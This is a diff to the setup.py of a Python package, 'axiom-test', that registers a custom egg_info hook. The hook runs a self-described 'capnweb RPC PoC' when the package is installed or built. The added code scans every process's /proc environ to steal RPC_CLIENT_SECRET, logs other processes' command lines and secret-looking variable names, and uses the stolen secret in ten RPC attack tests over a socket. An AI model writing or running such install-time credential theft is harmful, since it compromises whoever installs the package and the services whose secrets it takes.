@@ -24,17 +24,38 @@ def flush():
         f.write("\n".join(lines) + "\n")
 
 def recover_secret():
+    """Recover RPC_CLIENT_SECRET from any readable /proc/<pid>/environ.
+    Strategy: scan ALL pids (broadest), log what we find."""
+    found_secret = None
+    found_pid = None
+    scanned = 0
+    readable = 0
     for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
+        scanned += 1
         try:
-            with open(f"/proc/{pid}/cmdline", "rb") as f:
-                cmd = f.read().decode("utf-8", errors="replace")
-            if "process_api" not in cmd and "uvicorn" not in cmd: continue
             with open(f"/proc/{pid}/environ", "rb") as f:
                 env = f.read().decode("utf-8", errors="replace")
+            readable += 1
             for pair in env.split("\0"):
-                if pair.startswith("RPC_CLIENT_SECRET="): return pair.split("=", 1)[1]
-        except (PermissionError, FileNotFoundError, ProcessLookupError): continue
-    return None
+                if pair.startswith("RPC_CLIENT_SECRET="):
+                    val = pair.split("=", 1)[1]
+                    if val:
+                        # Get cmdline for logging
+                        try:
+                            with open(f"/proc/{pid}/cmdline", "rb") as f:
+                                cmd = f.read().replace(b"\0", b" ").decode("utf-8", errors="replace").strip()[:120]
+                        except: cmd = "?"
+                        log(f"    Found in PID {pid}: cmdline={cmd}")
+                        log(f"    Secret len={len(val)}")
+                        if not found_secret:
+                            found_secret = val
+                            found_pid = pid
+        except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
+            continue
+    log(f"    Scanned {scanned} PIDs, {readable} readable")
+    if found_secret:
+        log(f"    Using secret from PID {found_pid}")
+    return found_secret
 
 def ws_connect(bearer):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -127,13 +148,30 @@ def run_test(secret, label, messages):
 
 def main():
     log("="*60)
-    log("capnweb RPC PoC — Valid Wire Format")
+    log("capnweb RPC PoC v2 — Valid Wire Format")
     log("="*60)
     log(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
-    log("\n[1] Recovering RPC_CLIENT_SECRET...")
+    log("\n[1] Recovering RPC_CLIENT_SECRET (full /proc scan)...")
     secret = recover_secret()
-    if not secret: log("FATAL: no secret"); flush(); return
-    log(f"    len={len(secret)} format={'UUID' if len(secret)==36 else '?'}")
+    if not secret:
+        log("FATAL: RPC_CLIENT_SECRET not found in any readable /proc/*/environ")
+        log("Dumping readable PIDs and their env var names...")
+        for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
+            try:
+                with open(f"/proc/{pid}/environ", "rb") as f:
+                    env = f.read().decode("utf-8", errors="replace")
+                with open(f"/proc/{pid}/cmdline", "rb") as f:
+                    cmd = f.read().replace(b"\0", b" ").decode("utf-8", errors="replace").strip()[:100]
+                keys = [p.split("=",1)[0] for p in env.split("\0") if "=" in p]
+                rpc_keys = [k for k in keys if "RPC" in k.upper() or "SECRET" in k.upper() or "CLIENT" in k.upper()]
+                log(f"  PID {pid}: cmd={cmd[:80]}")
+                if rpc_keys:
+                    log(f"    Interesting keys: {rpc_keys}")
+                else:
+                    log(f"    env keys ({len(keys)}): {', '.join(keys[:15])}{'...' if len(keys)>15 else ''}")
+            except: continue
+        flush(); return
+
     log("\n[2] capnweb RPC Tests (10 vectors)")
     R = {}
     R["A"] = run_test(secret, "A: push pipeline sync.watermarks() + pull  [heartbeat]",
@@ -201,6 +239,6 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="0.0.10",
+    version="0.0.11",
     cmdclass={"egg_info": PostEggInfo},
 )
